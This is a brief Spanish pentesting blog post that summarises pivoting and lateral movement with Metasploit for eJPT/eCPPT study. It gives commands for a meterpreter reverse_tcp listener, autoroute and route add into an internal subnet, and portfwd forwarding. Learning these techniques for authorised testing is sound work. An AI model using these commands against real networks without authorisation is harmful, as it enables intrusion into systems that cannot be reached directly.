---
title: 'Pivoting con Metasploit en Linux'
description: 'Técnicas de movimiento lateral usando Metasploit.'
pubDate: '2025-12-21'
categories: ['Red Team']
tags: ['metasploit', 'pivoting', 'linux', 'lateral movement']
heroImage: '../../assets/img/pivoting-metasploit-linux.jpg'
slug: "pivoting-metasploit"

---

El **Pivoting** (o movimiento lateral) es una técnica crucial en el pentesting que nos permite utilizar un sistema comprometido para atacar otros sistemas en la misma red que no son accesibles directamente.

Esta técnica es fundamental para certificaciones como la **eJPT** y **eCPPT**.

Aquí os dejo una infografía que he creado resumiendo el proceso paso a paso utilizando **Metasploit** y `autoroute`:

![Guía de Pivoting con Metasploit](../../assets/img/pivoting-metasploit-linux.jpg){: .shadow }

## Resumen de comandos clave

1.  **Configurar Listener:**
    ```bash
    use multi/handler
    set PAYLOAD linux/x86/meterpreter/reverse_tcp
    ```
2.  **Añadir ruta (Routing):**
    ```bash
    # Desde la sesión de meterpreter
    run autoroute -s 10.10.10.0/24
    # O desde fuera
    route add 10.10.10.0 255.255.255.0 <SessionID>
    ```
3.  **Port Forwarding:**
    ```bash
    portfwd add -l 5000 -p 80 -r 10.10.10.5
    ```
